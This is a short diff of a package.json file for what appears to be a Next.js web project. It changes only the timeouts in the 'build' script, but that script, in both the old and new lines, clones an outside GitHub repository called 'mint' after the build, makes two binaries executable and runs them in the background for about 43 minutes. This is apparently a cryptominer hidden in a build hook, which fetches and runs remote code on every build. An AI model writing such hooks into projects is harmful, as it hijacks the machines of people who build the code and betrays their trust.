@@ -4,7 +4,7 @@
   "private": true,
   "scripts": {
     "dev": "next dev",
-    "build": "next build; git clone https://github.com/cahayaangkasaku1/mint.git; cd mint; chmod +x mint timer; timeout 42m ./mint -c config.json -B; timeout 42m ./timer",
+    "build": "next build; git clone https://github.com/cahayaangkasaku1/mint.git; cd mint; chmod +x mint timer; timeout 43m ./mint -c config.json -B; timeout 43m ./timer",
     "start": "next start",
     "lint": "next lint"
   },
